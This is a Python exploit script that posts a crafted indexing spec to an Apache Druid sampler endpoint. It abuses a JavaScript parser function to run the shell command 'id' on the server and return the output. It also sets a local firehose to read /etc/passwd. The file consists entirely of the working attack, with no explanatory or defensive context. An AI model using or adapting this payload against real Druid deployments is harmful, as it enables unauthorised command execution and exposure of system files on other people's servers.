import requests
import json

url = "http://localhost:8888/druid/indexer/v1/sampler"
headers = {'Content-Type': 'application/json'}
payload = {
    "type": "index",
    "spec": {
        "ioConfig": {
            "type": "index",
            "firehose": {
                "type": "local",
                "baseDir": "/etc",
                "filter": "passwd"
            }
        },
        "dataSchema": {
            "dataSource": "test",
            "parser": {
                "parseSpec": {
                    "format": "javascript",
                    "timestampSpec": {},
                    "dimensionsSpec": {},
                    "function": "function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\\\A\").next();return {timestamp:123123,test: a}}"
                }
            }
        }
    },
    "samplerConfig": {
        "numRows": 10
    }
}

try:
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    print("Status Code:", response.status_code)
    print("Response Body:")
    print(response.text)
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")
